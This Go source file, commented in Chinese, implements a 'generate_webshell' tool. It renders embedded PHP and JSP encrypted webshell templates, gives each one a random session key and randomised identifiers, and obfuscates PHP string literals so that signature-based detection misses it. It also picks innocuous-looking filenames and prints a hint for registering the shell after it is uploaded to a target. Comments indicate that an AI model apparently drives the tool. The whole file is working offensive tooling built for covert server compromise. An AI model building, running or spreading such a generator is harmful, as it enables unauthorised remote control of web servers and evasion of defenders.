// shellgen.go 是加密马生成器(generate_webshell 工具的实现):渲染内嵌模板
// (shelltpl/*.tpl,Go embed),每份马体随机 32B 会话密钥(crypto/rand)、随机化
// 全部函数/变量名(静态特征最小化)、可选 PHP 轻度语法变形。
//
// 反过拟合:模板与协议无任何特定目标值;密钥/文件名/标识符全部运行时随机。
package session

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"sort"
	"strings"
	"text/template"
)

//go:embed shelltpl/php_enc.php.tpl
var phpEncTemplate string

//go:embed shelltpl/jsp_enc.jsp.tpl
var jspEncTemplate string

// GeneratedShell 是 generate_webshell 的产物。KeyB64 是 register_session 的
// secret 参数;KeyDigest 供审计对照（不落库明文场景使用）。
type GeneratedShell struct {
	Lang      string `json:"lang"`        // phpenc | jspenc(register_session 的 lang 参数）
	Filename  string `json:"filename"`    // 建议文件名（随机化，无语义特征）
	Content   string `json:"content"`     // 马体全文（模板渲染后，可审计）
	KeyB64    string `json:"key_b64"`     // 会话密钥（base64 32B,register_session 的 secret)
	KeyDigest string `json:"key_digest"`  // sha256(密钥）前 16 hex，审计对照用
	Mode      string `json:"mode"`        // 加密模式标识（写死于马体）
	Note      string `json:"note,omitempty"`
	// RegisterHint 是上传后登记会话的精确调用示例（模型常把 key 误放进
	// password 字段，给出可直接照抄的调用形态;password 作为 secret 别名也被接受）。
	RegisterHint string `json:"register_hint"`
}

// tplIdentNames 是两份模板用到的全部 {{.Xxx}} 占位（KeyB64 除外，单独处理）。
// 生成器为每个占位分配随机标识符；渲染用 missingkey=error，占位遗漏直接报错。
var tplIdentNames = []string{
	// PHP 模板
	"VKey", "VMethods", "VMode", "VResp", "VPlain", "VJson", "VReq", "VOp",
	"VCode", "VT", "VData", "VFlag", "VR",
	"FDec", "FEnc", "FFrame", "FUnframe",
	// JSP 模板（同名占位复用同一随机名即可，两份模板独立渲染）
	"FK", "FG", "FBody", "VOut", "VErr", "VOk", "VRaw", "VP", "VB", "VI",
	"VBuf", "VN", "VF", "VFI", "VFO",
}

// shellNamePrefixes 是建议文件名的随机前缀（通用词，无任何目标特征）。
var shellNamePrefixes = []string{"cache", "sys", "img", "db", "conf", "util", "lib", "api"}

// randIdent 生成一个随机标识符（字母开头，9 字符）。
func randIdent() string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	const alnum = letters + "0123456789"
	var b [9]byte
	_, _ = rand.Read(b[:])
	var sb strings.Builder
	sb.WriteByte(letters[int(b[0])%len(letters)])
	for i := 1; i < len(b); i++ {
		sb.WriteByte(alnum[int(b[i])%len(alnum)])
	}
	return sb.String()
}

// randPick 从列表随机取一项。
func randPick(items []string) string {
	var b [1]byte
	_, _ = rand.Read(b[:])
	return items[int(b[0])%len(items)]
}

// GenerateShell 生成一份加密马。lang: php | jsp。obfuscate 仅对 PHP 生效：
// 对渲染后的马体做轻度语法变形（高特征字符串字面量拆分/拼接）。
func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, error) {
	lang = strings.ToLower(strings.TrimSpace(lang))
	var tpl, mode string
	switch lang {
	case "php":
		tpl = phpEncTemplate
		mode = "auto:gcm|cbc" // GCM 优先，目标无 GCM 时马体运行时降级 CBC+HMAC
	case "jsp":
		tpl = jspEncTemplate
		mode = "gcm"
	default:
		return nil, opError("generate", "不支持的马体语言 %q（支持 php/jsp)", lang)
	}
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, opError("generate", "密钥生成失败： %v", err)
	}
	keyB64 := base64.StdEncoding.EncodeToString(key)

	// 每个占位一个随机标识符（集合去重：撞名会让两个语义变量同名，必须排除）。
	fields := map[string]string{"KeyB64": keyB64}
	used := map[string]bool{}
	for _, name := range tplIdentNames {
		if _, ok := fields[name]; ok {
			continue // 两份模板共享的同名占位复用同一随机名
		}
		id := randIdent()
		for used[id] {
			id = randIdent()
		}
		used[id] = true
		fields[name] = id
	}
	t, err := template.New("shell").Option("missingkey=error").Parse(tpl)
	if err != nil {
		return nil, opError("generate", "马体模板解析失败： %v", err)
	}
	var buf bytes.Buffer
	if err := t.Execute(&buf, fields); err != nil {
		return nil, opError("generate", "马体模板渲染失败： %v", err)
	}
	content := buf.String()
	if obfuscate && lang == "php" {
		content = obfuscatePHP(content, keyB64)
	}
	digest := sha256.Sum256(key)
	var fnb [3]byte
	_, _ = rand.Read(fnb[:])
	ext := lang
	filename := fmt.Sprintf("%s_%s.%s", randPick(shellNamePrefixes), hex.EncodeToString(fnb[:]), ext)
	return &GeneratedShell{
		Lang:      lang + "enc",
		Filename:  filename,
		Content:   content,
		KeyB64:    keyB64,
		KeyDigest: hex.EncodeToString(digest[:])[:16],
		Mode:      mode,
		Note:      note,
		RegisterHint: fmt.Sprintf(
			`上传后调用: register_session({"url":"http://<目标>/<上传路径>/%s","lang":"%s","secret":"%s"})`,
			filename, lang+"enc", keyB64),
	}, nil
}

// obfuscatePHP 对渲染后的 PHP 马体做轻度语法变形：把高熵/高特征字符串字面量
// （密钥、算法名、域分隔串、输入源）拆成多段单引号拼接。
//
// 取舍（注释即承诺）:只做拆分/拼接这类「等价改写」,不做 eval(base64(...))、
// gzinflate 套娃等高特征形态——那是签名库首要命中点，变形收益为负；轻度变形
// 抹掉的是「整串常量」特征，同时保持马体可读可审计。
func obfuscatePHP(src, keyB64 string) string {
	literals := []string{keyB64, "aes-256-gcm", "aes-256-cbc", "artex-enc-v1", "artex-mac-v1", "php://input"}
	// 长字面量优先，防短串恰好是长串子串造成二次拆分。
	sort.Slice(literals, func(i, j int) bool { return len(literals[i]) > len(literals[j]) })
	for _, lit := range literals {
		src = strings.ReplaceAll(src, "'"+lit+"'", phpConcatLit(lit))
	}
	return src
}

// phpConcatLit 把字符串拆成 2~4 段单引号字面量拼接（PHP 编译期常量折叠，语义不变）。
func phpConcatLit(s string) string {
	if len(s) < 6 {
		return "'" + s + "'"
	}
	var b [1]byte
	_, _ = rand.Read(b[:])
	parts := 2 + int(b[0])%3 // 2~4 段
	cuts := map[int]bool{}
	for len(cuts) < parts-1 {
		var c [1]byte
		_, _ = rand.Read(c[:])
		cuts[1+int(c[0])%(len(s)-1)] = true
	}
	var points []int
	for p := range cuts {
		points = append(points, p)
	}
	sort.Ints(points)
	var segs []string
	prev := 0
	for _, p := range points {
		segs = append(segs, "'"+s[prev:p]+"'")
		prev = p
	}
	segs = append(segs, "'"+s[prev:]+"'")
	return strings.Join(segs, ".")
}
